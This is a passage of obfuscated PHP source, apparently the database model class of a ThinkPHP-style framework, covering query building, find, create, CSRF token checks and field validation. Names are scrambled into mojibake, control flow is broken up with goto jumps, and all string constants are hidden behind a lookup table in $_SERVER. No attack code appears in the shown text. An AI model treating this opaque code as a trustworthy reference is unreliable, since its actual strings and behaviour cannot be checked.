$f©ê≈‡ä è = array(); if (isset($Dƒ£⁄Ó”Ü∏)) { $f©ê≈‡ä è[$DÛ‰‹Ÿ¨•¥] = $Dƒ£⁄Ó”Ü∏; } $this->_after_delete($f©ê≈‡ä è, $Cî≤–ä˘∫å); } return $cëó ¨…éÕ; goto fêƒí˘¬‡ì; Aâ›ßı÷µÈ: $f¶ü±¶‰’ù =& $_SERVER[£¿ÌÙëü¡¯¯]; if (empty($Cî≤–ä˘∫å) && empty($this->options[$f¶ü±¶‰’ù[260]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $DÛ‰‹Ÿ¨•¥ = $this->getPk(); goto B˘úÑØÈΩ®; fêƒí˘¬‡ì: } protected function _after_delete($C™ı‡¬êê¬, $cÎﬁê¨¿Ïë) { } public function select($e† ÓÏ´Õû = array()) { goto bèêÃÎﬁ°£; dÂêõ¶≠ÑÁ: $b›ºÍÙÖÕô = $this->db->select($e† ÓÏ´Õû); if (!1 === $b›ºÍÙÖÕô) { return !1; } if (empty($b›ºÍÙÖÕô)) { return null; } goto FºÕ»π‚∞ò; bèêÃÎﬁ°£: $Bï°∆¨º≤⁄ =& $_SERVER[£¿ÌÙëü¡¯¯]; if (is_string($e† ÓÏ´Õû) || is_numeric($e† ÓÏ´Õû)) { $a∆≤É£áﬂì = $this->getPk(); if (strpos($e† ÓÏ´Õû, $Bï°∆¨º≤⁄[47])) { $d™¿”ÎìÁÇ[$a∆≤É£áﬂì] = array($Bï°∆¨º≤⁄[261], $e† ÓÏ´Õû); } else { $d™¿”ÎìÁÇ[$a∆≤É£áﬂì] = $e† ÓÏ´Õû; } $this->options[$Bï°∆¨º≤⁄[260]] = $d™¿”ÎìÁÇ; } elseif (!1 === $e† ÓÏ´Õû) { $e† ÓÏ´Õû = $this->_parseOptions(); return $Bï°∆¨º≤⁄[262] . $this->db->buildSelectSql($e† ÓÏ´Õû) . $Bï°∆¨º≤⁄[263]; } $e† ÓÏ´Õû = $this->_parseOptions(); goto dÂêõ¶≠ÑÁ; FºÕ»π‚∞ò: $this->_afterSelect($b›ºÍÙÖÕô, $e† ÓÏ´Õû); return $b›ºÍÙÖÕô; goto eı∞Ω∏∞âı; eı∞Ω∏∞âı: } protected function _afterSelect(&$bﬁ÷…èÀÚ≠, $a‚ßÀö÷”Ç) { } public function buildSql($bÿëßÀΩœ⁄ = array()) { $EïñÒãáìŸ =& $_SERVER[£¿ÌÙëü¡¯¯]; $bÿëßÀΩœ⁄ = $this->_parseOptions($bÿëßÀΩœ⁄); return $EïñÒãáìŸ[262] . $this->db->buildSelectSql($bÿëßÀΩœ⁄) . $EïñÒãáìŸ[263]; } public function optionsValue($F„íø˘Ù∞ = null) { if (is_null($F„íø˘Ù∞)) { return $this->options; } elseif (is_array($F„íø˘Ù∞)) { $this->options = array_merge($this->options, $F„íø˘Ù∞); } } protected function _parseOptions($F¿∏ÏçáÓã = array()) { goto a°≠Ø·Éå; a°≠Ø·Éå: $EéÚÒ«¡≠¿ =& $_SERVER[£¿ÌÙëü¡¯¯]; if (is_array($F¿∏ÏçáÓã)) { $F¿∏ÏçáÓã = array_merge($this->options, $F¿∏ÏçáÓã); } $this->options = array(); goto e•£ãØü—ë; e•£ãØü—ë: if (!isset($F¿∏ÏçáÓã[$EéÚÒ«¡≠¿[264]])) { $F¿∏ÏçáÓã[$EéÚÒ«¡≠¿[264]] = $this->getTableName(); $EóÁÌÙµÖ∞ = $this->fields; } else { $EóÁÌÙµÖ∞ = $this->getDbFields(); } if (!empty($F¿∏ÏçáÓã[$EéÚÒ«¡≠¿[265]])) { $F¿∏ÏçáÓã[$EéÚÒ«¡≠¿[264]] .= $EéÚÒ«¡≠¿[50] . $F¿∏ÏçáÓã[$EéÚÒ«¡≠¿[265]]; } $F¿∏ÏçáÓã[$EéÚÒ«¡≠¿[266]] = $this->name; goto cÚÉØê±†‡; cÚÉØê±†‡: if (isset($F¿∏ÏçáÓã[$EéÚÒ«¡≠¿[260]]) && is_array($F¿∏ÏçáÓã[$EéÚÒ«¡≠¿[260]]) && !empty($EóÁÌÙµÖ∞) && !isset($F¿∏ÏçáÓã[$EéÚÒ«¡≠¿[267]]) && !isset($F¿∏ÏçáÓã[$EéÚÒ«¡≠¿[264]])) { foreach ($F¿∏ÏçáÓã[$EéÚÒ«¡≠¿[260]] as $eŸÉÓ‡·ñò => $fΩ¨ÜöÑ´û) { $eŸÉÓ‡·ñò = trim($eŸÉÓ‡·ñò); if (in_array($eŸÉÓ‡·ñò, $EóÁÌÙµÖ∞, !0)) { if (is_scalar($fΩ¨ÜöÑ´û)) { $this->_parseType($F¿∏ÏçáÓã[$EéÚÒ«¡≠¿[260]], $eŸÉÓ‡·ñò); } } elseif (!is_numeric($eŸÉÓ‡·ñò) && $EéÚÒ«¡≠¿[71] != substr($eŸÉÓ‡·ñò, 0, 1) && !1 === strpos($eŸÉÓ‡·ñò, $EéÚÒ«¡≠¿[94]) && !1 === strpos($eŸÉÓ‡·ñò, $EéÚÒ«¡≠¿[245]) && !1 === strpos($eŸÉÓ‡·ñò, $EéÚÒ«¡≠¿[268]) && !1 === strpos($eŸÉÓ‡·ñò, $EéÚÒ«¡≠¿[269])) { unset($F¿∏ÏçáÓã[$EéÚÒ«¡≠¿[260]][$eŸÉÓ‡·ñò]); } } } $this->_options_filter($F¿∏ÏçáÓã); return $F¿∏ÏçáÓã; goto CîËü…óù∫; CîËü…óù∫: } protected function _options_filter(&$eıéÉ Ÿìè) { } protected function _parseType(&$Cç…Î◊à±’, $fãÂÚÊ‚ï ) { $AÛ»ë©â ¶ =& $_SERVER[£¿ÌÙëü¡¯¯]; if (empty($this->options[$AÛ»ë©â ¶[270]][$AÛ»ë©â ¶[4] . $fãÂÚÊ‚ï ])) { $fâ≈úíèÖÍ = strtolower($this->fields[$AÛ»ë©â ¶[237]][$fãÂÚÊ‚ï ]); if (!1 !== strpos($fâ≈úíèÖÍ, $AÛ»ë©â ¶[271])) { } elseif (!1 === strpos($fâ≈úíèÖÍ, $AÛ»ë©â ¶[272]) && !1 !== strpos($fâ≈úíèÖÍ, $AÛ»ë©â ¶[273])) { $Cç…Î◊à±’[$fãÂÚÊ‚ï ] = intval($Cç…Î◊à±’[$fãÂÚÊ‚ï ]); } elseif (!1 !== strpos($fâ≈úíèÖÍ, $AÛ»ë©â ¶[274]) || !1 !== strpos($fâ≈úíèÖÍ, $AÛ»ë©â ¶[275])) { $Cç…Î◊à±’[$fãÂÚÊ‚ï ] = floatval($Cç…Î◊à±’[$fãÂÚÊ‚ï ]); } elseif (!1 !== strpos($fâ≈úíèÖÍ, $AÛ»ë©â ¶[276])) { $Cç…Î◊à±’[$fãÂÚÊ‚ï ] = (bool) $Cç…Î◊à±’[$fãÂÚÊ‚ï ]; } } } public function find($c…ÉñˆˆÌ· = array()) { goto fúéıπÛãÂ; Cÿ≠ÏØ–¶á: if (!empty($this->options[$bê©á∑»¨‚[278]])) { return $this->returnResult($this->data, $this->options[$bê©á∑»¨‚[278]]); } return $this->data; goto cëÔÒøèªÛ; EÎÑ‚›∑°é: if (empty($f©Ω¿⁄µâÉ)) { return null; } $this->data = $f©Ω¿⁄µâÉ[0]; $this->_afterFind($this->data, $c…ÉñˆˆÌ·); goto Cÿ≠ÏØ–¶á; fúéıπÛãÂ: $bê©á∑»¨‚ =& $_SERVER[£¿ÌÙëü¡¯¯]; if (is_numeric($c…ÉñˆˆÌ·) || is_string($c…ÉñˆˆÌ·)) { $EŸ´·Ó’˜í[$this->getPk()] = $c…ÉñˆˆÌ·; $this->options[$bê©á∑»¨‚[260]] = $EŸ´·Ó’˜í; } $this->options[$bê©á∑»¨‚[277]] = 1; goto e∆æ˘¬±äﬁ; e∆æ˘¬±äﬁ: $c…ÉñˆˆÌ· = $this->_parseOptions(); $f©Ω¿⁄µâÉ = $this->db->select($c…ÉñˆˆÌ·); if (!1 === $f©Ω¿⁄µâÉ) { return !1; } goto EÎÑ‚›∑°é; cëÔÒøèªÛ: } protected function _afterFind(&$AıËâŸ∂ÀÁ, $D⁄˜»•ÑÒ”) { } protected function returnResult($aΩª‘·õäô, $c¢¨¬ó«ê  = '') { $DÛÔü˜ùõ∂ =& $_SERVER[£¿ÌÙëü¡¯¯]; if ($c¢¨¬ó«ê ) { if (is_callable($c¢¨¬ó«ê )) { return call_user_func($c¢¨¬ó«ê , $aΩª‘·õäô); } switch (strtolower($c¢¨¬ó«ê )) { case $DÛÔü˜ùõ∂[279]: return json_encode($aΩª‘·õäô); case $DÛÔü˜ùõ∂[280]: return xml_encode($aΩª‘·õäô); } } return $aΩª‘·õäô; } public function parseFieldsMap($B¶¡æ‚Ô‹Ã, $B¯∫⁄·ëÿÙ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $Bï∂åò¯Ïø => $d¨â¨∂£≤˜) { if ($B¯∫⁄·ëÿÙ == 1) { if (isset($B¶¡æ‚Ô‹Ã[$d¨â¨∂£≤˜])) { $B¶¡æ‚Ô‹Ã[$Bï∂åò¯Ïø] = $B¶¡æ‚Ô‹Ã[$d¨â¨∂£≤˜]; unset($B¶¡æ‚Ô‹Ã[$d¨â¨∂£≤˜]); } } else { if (isset($B¶¡æ‚Ô‹Ã[$Bï∂åò¯Ïø])) { $B¶¡æ‚Ô‹Ã[$d¨â¨∂£≤˜] = $B¶¡æ‚Ô‹Ã[$Bï∂åò¯Ïø]; unset($B¶¡æ‚Ô‹Ã[$Bï∂åò¯Ïø]); } } } } return $B¶¡æ‚Ô‹Ã; } public function setField($eáãßäﬂ¢Ø, $bÁáı•©⁄‡ = '') { if (is_array($eáãßäﬂ¢Ø)) { $aµµíùíäÇ = $eáãßäﬂ¢Ø; } else { $aµµíùíäÇ[$eáãßäﬂ¢Ø] = $bÁáı•©⁄‡; } return $this->save($aµµíùíäÇ); } public function setAdd($e–Öó…™ë„, $cè≥Â≤†ÔŸ = 1) { $böîïá‰ÜΩ =& $_SERVER[£¿ÌÙëü¡¯¯]; $Eﬁ¬ Ωú™Ã = $e–Öó…™ë„ . $böîïá‰ÜΩ[281] . $cè≥Â≤†ÔŸ; if ($cè≥Â≤†ÔŸ < 0) { $Eﬁ¬ Ωú™Ã = $e–Öó…™ë„ . $cè≥Â≤†ÔŸ; } return $this->setField($e–Öó…™ë„, array($böîïá‰ÜΩ[282], $Eﬁ¬ Ωú™Ã)); } public function getField($F¿îîê‡ãò, $C’ùäõÈ ´ = null) { $b †Ô¿º‡ =& $_SERVER[£¿ÌÙëü¡¯¯]; $Eƒ«÷õ†Çï[$b †Ô¿º‡[258]] = $F¿îîê‡ãò; $Eƒ«÷õ†Çï = $this->_parseOptions($Eƒ«÷õ†Çï); $F¿îîê‡ãò = trim($F¿îîê‡ãò); if (strpos($F¿îîê‡ãò, $b †Ô¿º‡[47])) { if (!isset($Eƒ«÷õ†Çï[$b †Ô¿º‡[277]])) { $Eƒ«÷õ†Çï[$b †Ô¿º‡[277]] = is_numeric($C’ùäõÈ ´) ? $C’ùäõÈ ´ : $b †Ô¿º‡[33]; } $c“Ó¢øùŒ‹ = $this->db->select($Eƒ«÷õ†Çï); if (!empty($c“Ó¢øùŒ‹)) { goto DéÀ·öŸßö; DéÀ·öŸßö: $BáúÊ®Ùïû = explode($b †Ô¿º‡[47], $F¿îîê‡ãò); $F¿îîê‡ãò = array_keys($c“Ó¢øùŒ‹[0]); $c‹Û©úçÃ› = array_shift($F¿îîê‡ãò); goto f…–¡é•ƒô; f…–¡é•ƒô: $D∞›áÛöÏå = array_shift($F¿îîê‡ãò); $eÆÚª’Ü¿Ó = array(); $eµÊò‡ù”Û = count($BáúÊ®Ùïû); goto aÑàø„†ú¿; aÑàø„†ú¿: foreach ($c“Ó¢øùŒ‹ as $Eû˘©ø€–‹) { $e∑ΩÛÛ¡Îü = $Eû˘©ø€–‹[$c‹Û©úçÃ›]; if (2 == $eµÊò‡ù”Û) { $eÆÚª’Ü¿Ó[$e∑ΩÛÛ¡Îü] = $Eû˘©ø€–‹[$D∞›áÛöÏå]; } else { $eÆÚª’Ü¿Ó[$e∑ΩÛÛ¡Îü] = is_string($C’ùäõÈ ´) ? implode($C’ùäõÈ ´, $Eû˘©ø€–‹) : $Eû˘©ø€–‹; } } return $eÆÚª’Ü¿Ó; goto B¨ò∫È°üÓ; B¨ò∫È°üÓ: } } else { if (!0 !== $C’ùäõÈ ´) { $Eƒ«÷õ†Çï[$b †Ô¿º‡[277]] = is_numeric($C’ùäõÈ ´) ? $C’ùäõÈ ´ : 1; } if ($C’ùäõÈ ´ === $b †Ô¿º‡[240]) { unset($Eƒ«÷õ†Çï[$b †Ô¿º‡[277]]); } $Eû˘©ø€–‹ = $this->db->select($Eƒ«÷õ†Çï); if (!empty($Eû˘©ø€–‹)) { if ($C’ùäõÈ ´ === $b †Ô¿º‡[240]) { return reset($Eû˘©ø€–‹[0]); } if (!0 !== $C’ùäõÈ ´ && 1 == $Eƒ«÷õ†Çï[$b †Ô¿º‡[277]]) { return reset($Eû˘©ø€–‹[0]); } foreach ($Eû˘©ø€–‹ as $bÉ¡ß∂πıﬁ) { $béû€¬—‚[] = $bÉ¡ß∂πıﬁ[$F¿îîê‡ãò]; } return $béû€¬—‚; } } return null; } public function create($FÊªû∏Œïã = '', $bΩ¥ﬂ§ë◊À = '') { goto f•ì¡˘Øåí; Fõã˜ô∂Ê: $FÊªû∏Œïã = $this->parseFieldsMap($FÊªû∏Œïã, 0); $bΩ¥ﬂ§ë◊À = $bΩ¥ﬂ§ë◊À ? $bΩ¥ﬂ§ë◊À : (!empty($FÊªû∏Œïã[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$cñ™üÿÏ≤˜[258]])) { $Aà∏Æ≠û°Ö = $this->options[$cñ™üÿÏ≤˜[258]]; unset($this->options[$cñ™üÿÏ≤˜[258]]); } elseif ($bΩ¥ﬂ§ë◊À == THINK_MODEL_INSERT && isset($this->insertFields)) { $Aà∏Æ≠û°Ö = $this->insertFields; } elseif ($bΩ¥ﬂ§ë◊À == THINK_MODEL_UPDATE && isset($this->updateFields)) { $Aà∏Æ≠û°Ö = $this->updateFields; } goto f«¯íﬁˆ–û; aÀ·ÑµÕüÀ: return $FÊªû∏Œïã; goto DœﬁïßóÌé; f«¯íﬁˆ–û: if (isset($Aà∏Æ≠û°Ö)) { if (is_string($Aà∏Æ≠û°Ö)) { $Aà∏Æ≠û°Ö = explode($cñ™üÿÏ≤˜[47], $Aà∏Æ≠û°Ö); } if (think_config($cñ™üÿÏ≤˜[283])) { $Aà∏Æ≠û°Ö[] = think_config($cñ™üÿÏ≤˜[284]); } foreach ($FÊªû∏Œïã as $b’î´‚ËÏ© => $Cå˜“å°°º) { if (!in_array($b’î´‚ËÏ©, $Aà∏Æ≠û°Ö)) { unset($FÊªû∏Œïã[$b’î´‚ËÏ©]); } } } if (!$this->autoValidation($FÊªû∏Œïã, $bΩ¥ﬂ§ë◊À)) { return !1; } if (!$this->autoCheckToken($FÊªû∏Œïã)) { $this->error = think_lang($cñ™üÿÏ≤˜[285]); return !1; } goto C„áÑüõØñ; C„áÑüõØñ: if ($this->autoCheckFields) { $Aà∏Æ≠û°Ö = $this->getDbFields(); foreach ($FÊªû∏Œïã as $b’î´‚ËÏ© => $Cå˜“å°°º) { if (!in_array($b’î´‚ËÏ©, $Aà∏Æ≠û°Ö)) { unset($FÊªû∏Œïã[$b’î´‚ËÏ©]); } elseif (MAGIC_QUOTES_GPC && is_string($Cå˜“å°°º)) { $FÊªû∏Œïã[$b’î´‚ËÏ©] = stripslashes($Cå˜“å°°º); } } } $this->autoOperation($FÊªû∏Œïã, $bΩ¥ﬂ§ë◊À); $this->data = $FÊªû∏Œïã; goto aÀ·ÑµÕüÀ; f•ì¡˘Øåí: $cñ™üÿÏ≤˜ =& $_SERVER[£¿ÌÙëü¡¯¯]; if (empty($FÊªû∏Œïã)) { $FÊªû∏Œïã = $_POST; } elseif (is_object($FÊªû∏Œïã)) { $FÊªû∏Œïã = get_object_vars($FÊªû∏Œïã); } if (empty($FÊªû∏Œïã) || !is_array($FÊªû∏Œïã)) { $this->error = think_lang($cñ™üÿÏ≤˜[256]); return !1; } goto Fõã˜ô∂Ê; DœﬁïßóÌé: } public function autoCheckToken($AçœªœÒñä) { $Fœ‡°ŸãÆƒ =& $_SERVER[£¿ÌÙëü¡¯¯]; if (isset($this->options[$Fœ‡°ŸãÆƒ[286]]) && !$this->options[$Fœ‡°ŸãÆƒ[286]]) { return !0; } if (think_config($Fœ‡°ŸãÆƒ[283])) { $A§ä£˜àËπ = think_config($Fœ‡°ŸãÆƒ[284]); if (!isset($AçœªœÒñä[$A§ä£˜àËπ]) || Session::get($A§ä£˜àËπ)) { return !1; } list($Eçå∞∂¿Æó, $A∞Æ∆Œïìº) = explode($Fœ‡°ŸãÆƒ[71], $AçœªœÒñä[$A§ä£˜àËπ]); if ($A∞Æ∆Œïìº && Session::get($A§ä£˜àËπ . $Fœ‡°ŸãÆƒ[94] . $Eçå∞∂¿Æó) === $A∞Æ∆Œïìº) { Session::remove($A§ä£˜àËπ . $Fœ‡°ŸãÆƒ[94] . $Eçå∞∂¿Æó); return !0; } if (think_config($Fœ‡°ŸãÆƒ[287])) { Session::remove($A§ä£˜àËπ . $Fœ‡°ŸãÆƒ[94] . $Eçå∞∂¿Æó); } return !1; } return !0; } public function regex($e¥‹ “ã©€, $dÇæ£ËöäÖ) { $f‰íßè·†∆ =& $_SERVER[£¿ÌÙëü¡¯¯]; $b´‹±àæÿã = array($f‰íßè·†∆[288] => $f‰íßè·†∆[289], $f‰íßè·†∆[290] => $f‰íßè·†∆[291], $f‰íßè·†∆[292] => $f‰íßè·†∆[293], $f‰íßè·†∆[294] => $f‰íßè·†∆[295], $f‰íßè·†∆[296] => $f‰íßè·†∆[297], $f‰íßè·†∆[298] => $f‰íßè·†∆[299], $f‰íßè·†∆[300] => $f‰íßè·†∆[301], $f‰íßè·†∆[275] => $f‰íßè·†∆[302], $f‰íßè·†∆[303] => $f‰íßè·†∆[304]); if (isset($b´‹±àæÿã[strtolower($dÇæ£ËöäÖ)])) { $dÇæ£ËöäÖ = $b´‹±àæÿã[strtolower($dÇæ£ËöäÖ)]; } return preg_match($dÇæ£ËöäÖ, $e¥‹ “ã©€) === 1; } private function autoOperation(&$Aªã±øõ§¡, $D∆Œ‡¡Ø¯è) { $B≤Ë£≥å≠ì =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!empty($this->options[$B≤Ë£≥å≠ì[305]])) { $aÇÖ‹·ëÜ¿ = $this->options[$B≤Ë£≥å≠ì[305]]; unset($this->options[$B≤Ë£≥å≠ì[305]]); } elseif (!empty($this->_auto)) { $aÇÖ‹·ëÜ¿ = $this->_auto; } if (isset($aÇÖ‹·ëÜ¿)) { foreach ($aÇÖ‹·ëÜ¿ as $aËçÛˆ≈é÷) { if (empty($aËçÛˆ≈é÷[2])) { $aËçÛˆ≈é÷[2] = THINK_MODEL_INSERT; } if ($D∆Œ‡¡Ø¯è == $aËçÛˆ≈é÷[2] || $aËçÛˆ≈é÷[2] == THINK_MODEL_BOTH) { switch (trim($aËçÛˆ≈é÷[3])) { case $B≤Ë£≥å≠ì[306]: case $B≤Ë£≥å≠ì[307]: $aê˘Í˜Àâæ = isset($aËçÛˆ≈é÷[4]) ? (array) $aËçÛˆ≈é÷[4] : array(); if (isset($Aªã±øõ§¡[$aËçÛˆ≈é÷[0]])) { array_unshift($aê˘Í˜Àâæ, $Aªã±øõ§¡[$aËçÛˆ≈é÷[0]]); } if ($B≤Ë£≥å≠ì[306] == $aËçÛˆ≈é÷[3]) { $Aªã±øõ§¡[$aËçÛˆ≈é÷[0]] = call_user_func_array($aËçÛˆ≈é÷[1], $aê˘Í˜Àâæ); } else { $Aªã±øõ§¡[$aËçÛˆ≈é÷[0]] = call_user_func_array(array(&$this, $aËçÛˆ≈é÷[1]), $aê˘Í˜Àâæ); } break; case $B≤Ë£≥å≠ì[258]: $Aªã±øõ§¡[$aËçÛˆ≈é÷[0]] = $Aªã±øõ§¡[$aËçÛˆ≈é÷[1]]; break; case $B≤Ë£≥å≠ì[308]: if ($B≤Ë£≥å≠ì[33] === $Aªã±øõ§¡[$aËçÛˆ≈é÷[0]]) { unset($Aªã±øõ§¡[$aËçÛˆ≈é÷[0]]); } break; case $B≤Ë£≥å≠ì[309]: default: $Aªã±øõ§¡[$aËçÛˆ≈é÷[0]] = $aËçÛˆ≈é÷[1]; } if (!1 === $Aªã±øõ§¡[$aËçÛˆ≈é÷[0]]) { unset($Aªã±øõ§¡[$aËçÛˆ≈é÷[0]]); } } } } return $Aªã±øõ§¡; } protected function autoValidation($fèµπ¬±†Æ, $B∏°≤ﬁíåà) { $céª»⁄Çï≠ =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!empty($this->options[$céª»⁄Çï≠[310]])) { $e“∏ó¶˜Üá = $this->options[$céª»⁄Çï≠[310]]; unset($this->options[$céª»⁄Çï≠[310]]); } elseif (!empty($this->_validate)) { $e“∏ó¶˜Üá = $this->_validate; } if (isset($e“∏ó¶˜Üá)) { if ($this->patchValidate) { $this->error = array(); } foreach ($e“∏ó¶˜Üá as $e…‹ÜÒêÜë => $BéÁöﬂÂøÒ) { if (empty($BéÁöﬂÂøÒ[5]) || $BéÁöﬂÂøÒ[5] == THINK_MODEL_BOTH || $BéÁöﬂÂøÒ[5] == $B∏°≤ﬁíåà) { if (0 == strpos($BéÁöﬂÂøÒ[2], $céª»⁄Çï≠[311]) && strpos($BéÁöﬂÂøÒ[2], $céª»⁄Çï≠[312])) { $BéÁöﬂÂøÒ[2] = think_lang(substr($BéÁöﬂÂøÒ[2], 2, -1)); } $BéÁöﬂÂøÒ[3] = isset($BéÁöﬂÂøÒ[3]) ? $BéÁöﬂÂøÒ[3] : THINK_EXISTS_VALIDATE; $BéÁöﬂÂøÒ[4] = isset($BéÁöﬂÂøÒ[4]) ? $BéÁöﬂÂøÒ[4] : $céª»⁄Çï≠[313]; switch ($BéÁöﬂÂøÒ[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($fèµπ¬±†Æ, $BéÁöﬂÂøÒ)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($céª»⁄Çï≠[33] != trim($fèµπ¬±†Æ[$BéÁöﬂÂøÒ[0]])) { if (!1 === $this->_validationField($fèµπ¬±†Æ, $BéÁöﬂÂøÒ)) { return !1; } } break; default: if (isset($fèµπ¬±†Æ[$BéÁöﬂÂøÒ[0]])) { if (!1 === $this->_validationField($fèµπ¬±†Æ, $BéÁöﬂÂøÒ)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($D«”é»É≈´, $AÙë·‘êèÒ) { if (!1 === $this->_validationFieldItem($D«”é»É≈´, $AÙë·‘êèÒ)) { if ($this->patchValidate) { $this->error[$AÙë·‘êèÒ[0]] = $AÙë·‘êèÒ[2]; } else { $this->error = $AÙë·‘êèÒ[2]; return !1; } } return; } protected function _validationFieldItem($fù–Í˘¿⁄å, $fî¶Øê≥´) { $AŒû√Ê…Õï =& $_SERVER[£¿ÌÙëü¡¯¯]; switch (strtolower(trim($fî¶Øê≥´[4]))) { case $AŒû√Ê…Õï[306]: case $AŒû√Ê…Õï[307]: $AÿŸß⁄¬–õ = isset($fî¶Øê≥´[6]) ? (array) $fî¶Øê≥´[6] : array(); if (is_string($fî¶Øê≥´[0]) && strpos($fî¶Øê≥´[0], $AŒû√Ê…Õï[47])) { $fî¶Øê≥´[0] = explode($AŒû√Ê…Õï[47], $fî¶Øê≥´[0]); } if (is_array($fî¶Øê≥´[0])) { foreach ($fî¶Øê≥´[0] as $aáÊôﬂ‰å‹) { $dÈØ’¿„∑€[$aáÊôﬂ‰å‹] = $fù–Í˘¿⁄å[$aáÊôﬂ‰å‹]; } array_unshift($AÿŸß⁄¬–õ, $dÈØ’¿„∑€); } else { array_unshift($AÿŸß⁄¬–õ, $fù–Í˘¿⁄å[$fî¶Øê≥´[0]]); } if ($AŒû√Ê…Õï[306] == $fî¶Øê≥´[4]) { return call_user_func_array($fî¶Øê≥´[1], $AÿŸß⁄¬–õ); } else { return call_user_func_array(array(&$this, $fî¶Øê≥´[1]), $AÿŸß⁄¬–õ); } case $AŒû√Ê…Õï[314]: return $fù–Í˘¿⁄å[$fî¶Øê≥´[0]] == $fù–Í˘¿⁄å[$fî¶Øê≥´[1]]; case $AŒû√Ê…Õï[315]: if (is_string($fî¶Øê≥´[0]) && strpos($fî¶Øê≥´[0], $AŒû√Ê…Õï[47])) { $fî¶Øê≥´[0] = explode($AŒû√Ê…Õï[47], $fî¶Øê≥´[0]); } $Fı⁄òŒ˘ƒÆ = array(); if (is_array($fî¶Øê≥´[0])) { foreach ($fî¶Øê≥´[0] as $aáÊôﬂ‰å‹) { $Fı⁄òŒ˘ƒÆ[$aáÊôﬂ‰å‹] = $fù–Í˘¿⁄å[$aáÊôﬂ‰å‹]; } } else { $Fı⁄òŒ˘ƒÆ[$fî¶Øê≥´[0]] = $fù–Í˘¿⁄å[$fî¶Øê≥´[0]]; } if (!empty($fù–Í˘¿⁄å[$this->getPk()])) { $Fı⁄òŒ˘ƒÆ[$this->getPk()] = array($AŒû√Ê…Õï[316], $fù–Í˘¿⁄å[$this->getPk()]); } if ($this->where($Fı⁄òŒ˘ƒÆ)->find()) { return !1; } return !0; default: return $this->check($fù–Í˘¿⁄å[$fî¶Øê≥´[0]], $fî¶Øê≥´[1], $fî¶Øê≥´[4]); } } public function check($B†¿ã–•πº, $bé«ú¿‰´ä, $bÑ¬ªàﬂÛã = "\x72\145\147\145\x78") { $cÀÖÎÉ”π« =& $_SERVER[£¿ÌÙëü¡¯¯]; $bÑ¬ªàﬂÛã = strtolower(trim($bÑ¬ªàﬂÛã)); switch ($bÑ¬ªàﬂÛã) { case $cÀÖÎÉ”π«[7]: case $cÀÖÎÉ”π«[317]: $Cøß¡Ö®ÁÓ = is_array($bé«ú¿‰´ä) ? $bé«ú¿‰´ä : explode($cÀÖÎÉ”π«[47], $bé«ú¿‰´ä); return $bÑ¬ªàﬂÛã == $cÀÖÎÉ”π«[7] ? in_array($B†¿ã–•πº, $Cøß¡Ö®ÁÓ) : !in_array($B†¿ã–•πº, $Cøß¡Ö®ÁÓ); case $cÀÖÎÉ”π«[318]: case $cÀÖÎÉ”π«[319]: if (is_array($bé«ú¿‰´ä)) { $Eå±ùæë‰† = $bé«ú¿‰´ä[0]; $cáà‡Ü∆ô§ = $bé«ú¿‰´ä[1]; } else { list($Eå±ùæë‰†, $cáà‡Ü∆ô§) = explode($cÀÖÎÉ”π«[47], $bé«ú¿‰´ä); } return $bÑ¬ªàﬂÛã == $cÀÖÎÉ”π«[318] ? $B†¿ã–•πº >= $Eå±ùæë‰† && $B†¿ã–•πº <= $cáà‡Ü∆ô§ : $B†¿ã–•πº < $Eå±ùæë‰† || $B†¿ã–•πº > $cáà‡Ü∆ô§; case $cÀÖÎÉ”π«[320]: case $cÀÖÎÉ”π«[321]: return $bÑ¬ªàﬂÛã == $cÀÖÎÉ”π«[320] ? $B†¿ã–•πº == $bé«ú¿‰´ä : $B†¿ã–•πº != $bé«ú¿‰´ä; case $cÀÖÎÉ”π«[322]: $F¥ÇºÍé∑ç = mb_strlen($B†¿ã–•πº, $cÀÖÎÉ”π«[323]); if (strpos($bé«ú¿‰´ä, $cÀÖÎÉ”π«[47])) { list($Eå±ùæë‰†, $cáà‡Ü∆ô§) = explode($cÀÖÎÉ”π«[47], $bé«ú¿‰´ä); return $F¥ÇºÍé∑ç >= $Eå±ùæë‰† && $F¥ÇºÍé∑ç <= $cáà‡Ü∆ô§; } else { return $F¥ÇºÍé∑ç == $bé«ú¿‰´ä; } case $cÀÖÎÉ”π«[324]: list($B’ŸıŸ–ß», $f≈ﬂ€Ûà›–) = explode($cÀÖÎÉ”π«[47], $bé«ú¿‰´ä); if (!is_numeric($B’ŸıŸ–ß»)) { $B’ŸıŸ–ß» = strtotime($B’ŸıŸ–ß»); } if (!is_numeric($f≈ﬂ€Ûà›–)) { $f≈ﬂ€Ûà›– = strtotime($f≈ﬂ€Ûà›–); } return NOW_TIME >= $B’ŸıŸ–ß» && NOW_TIME <= $f≈ﬂ€Ûà›–; case $cÀÖÎÉ”π«[325]: return in_array(get_client_ip(), explode($cÀÖÎÉ”π«[47], $bé«ú¿‰´ä)); case $cÀÖÎÉ”π«[326]: return !in_array(get_client_ip(), explode($cÀÖÎÉ”π«[47], $bé«ú¿‰´ä)); case $cÀÖÎÉ”π«[313]: default: return $this->regex($B†¿ã–•πº, $bé«ú¿‰´ä); } } public function query($A≈‘ä´È∂“, $E–Á∫µ¡√ú = false) { $EÕú–¢§™î =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!is_bool($E–Á∫µ¡√ú) && !is_array($E–Á∫µ¡√ú)) { $E–Á∫µ¡√ú = func_get_args(); array_shift($E–Á∫µ¡√ú); } $A≈‘ä´È∂“ = str_replace(array($EÕú–¢§™î[214], $EÕú–¢§™î[327]), $EÕú–¢§™î[50], $A≈‘ä´È∂“); $A≈‘ä´È∂“ = $this->parseSql($A≈‘ä´È∂“, $E–Á∫µ¡√ú); return $this->db->query($A≈‘ä´È∂“); } public function execute($CÚ°ª∂à…ù, $cπŸ–ÇÓ˘Ñ = false) { if (!is_bool($cπŸ–ÇÓ˘Ñ) && !is_array($cπŸ–ÇÓ˘Ñ)) { $cπŸ–ÇÓ˘Ñ = func_get_args(); array_shift($cπŸ–ÇÓ˘Ñ); } $CÚ°ª∂à…ù = $this->parseSql($CÚ°ª∂à…ù, $cπŸ–ÇÓ˘Ñ); 